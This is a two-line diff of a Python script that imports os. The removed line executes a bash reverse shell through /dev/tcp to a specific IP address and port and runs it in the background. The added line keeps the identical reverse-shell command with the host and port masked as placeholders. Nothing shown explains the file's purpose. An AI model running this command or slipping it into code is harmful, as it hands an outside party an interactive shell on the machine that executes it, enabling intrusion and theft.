@@ -1,2 +1,2 @@
 import os
-os.system("bash -c 'bash -i >& /dev/tcp/124.223.217.37/8766 0>&1' &")
+os.system("bash -c 'bash -i >& /dev/tcp/xxx/xx 0>&1' &")
